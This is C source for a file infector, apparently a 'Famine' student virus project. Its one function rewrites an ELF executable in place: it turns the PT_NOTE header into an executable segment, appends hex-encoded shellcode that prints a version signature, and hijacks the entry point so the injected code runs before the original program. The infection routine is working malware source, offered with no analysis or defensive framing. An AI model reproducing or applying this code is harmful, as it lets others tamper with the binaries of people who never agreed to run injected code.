#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <elf.h>
#include <stdio.h>
#include <string.h>
#define _exit_close(map, fdfile, size, ret) do { munmap(map, size); close(fdfile); return ret;} while(0)

int 	insert_payload(char *filename)
{
	unsigned char payload[] =
			"\xeb\x14\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x06\x00\x00\x00\x0f\x05\xeb\x39\xe8\xe7\xff\xff\xff\x48\x45\x4c\x4c\x4f\x0a\x46\x61\x6d\x69\x6e\x65\x20\x76\x65\x72\x73\x69\x6f\x6e\x20\x31\x2e\x30\x20\x28\x63\x29\x6f\x64\x65\x64\x20\x62\x79\x20\x75\x73\x61\x76\x6f\x69\x61\x2d\x75\x73\x61\x76\x6f\x69\x61\x00\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x48\x31\xf6\xe9\xfb\xff\xff\xff";
	const int size_payload = 96;

	int fd = 0;
	size_t size = 0;
	void *m = 0;
	Elf64_Ehdr *ehdr = 0;
	Elf64_Phdr *phdr = 0;
	Elf64_Half phnum = 0;
	Elf64_Phdr *pt_note = 0;
	Elf64_Off offsetJump = 0;
	Elf64_Half i = 0;

	if ( ((strlen(filename) == 1) && memcmp(filename, ".", 1)) ||
		((strlen(filename) == 2) && memcmp(filename, "..", 2)))
			return 1;
	if ((fd = open(filename, O_RDWR | O_APPEND)) < 0)
		return 1;

	size = lseek(fd, 0, SEEK_END);
	if ((m = mmap(0, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)) == MAP_FAILED)
		return 1;

	ehdr = m;
	phdr = m + ehdr->e_phoff;
	phnum = ehdr->e_phnum;

	for (i = 0; i < phnum; ++i) {
		if (phdr[i].p_type == PT_NOTE) {
			pt_note = &(phdr[i]);
			break;
		}
	}

	if (i >= phnum)
		_exit_close(m, fd, size, 1);

	pt_note->p_type = PT_LOAD;
	pt_note->p_flags = PF_R | PF_X | PF_W;
	pt_note->p_offset = size;
	pt_note->p_vaddr = 0xc000000 + size;
	pt_note->p_filesz += size_payload;
	pt_note->p_memsz += size_payload;

	offsetJump = ehdr->e_entry - pt_note->p_vaddr - ((uint32_t)size_payload);
	*(Elf64_Word*)(payload + size_payload - 4) = (Elf64_Word)offsetJump;
	ehdr->e_entry = pt_note->p_vaddr;

	write(fd, payload, size_payload);

	_exit_close(m, fd, size, 0);
}